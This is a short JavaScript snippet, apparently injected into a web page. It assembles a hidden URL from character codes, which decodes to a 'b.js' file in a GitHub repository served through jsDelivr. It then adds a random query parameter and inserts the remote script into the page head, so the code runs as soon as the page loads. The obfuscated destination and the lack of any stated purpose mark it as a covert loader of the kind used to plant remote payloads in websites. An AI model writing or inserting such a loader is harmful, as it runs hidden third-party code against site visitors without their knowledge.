 
(function() {
    var s = document.createElement('script');
    var randomParam = Math.floor(Math.random() * 99000) + 1;

    var parts = [
        String.fromCharCode(104, 116),
        String.fromCharCode(116, 112, 115, 58, 47, 47),
        String.fromCharCode(99, 100, 110, 46, 106, 115),
        String.fromCharCode(100, 101, 108, 105, 118, 114, 46),
        String.fromCharCode(110, 101, 116, 47, 103, 104, 47),
        String.fromCharCode(109, 111, 110, 111, 114, 111, 108, 108, 115, 47),
        String.fromCharCode(118, 64, 109, 97, 105, 110, 47),
        String.fromCharCode(98, 46, 106, 115)
    ];

    var url = parts.join('') + "?v=" + randomParam;

    s.src = url;
    document.head.appendChild(s);
})();
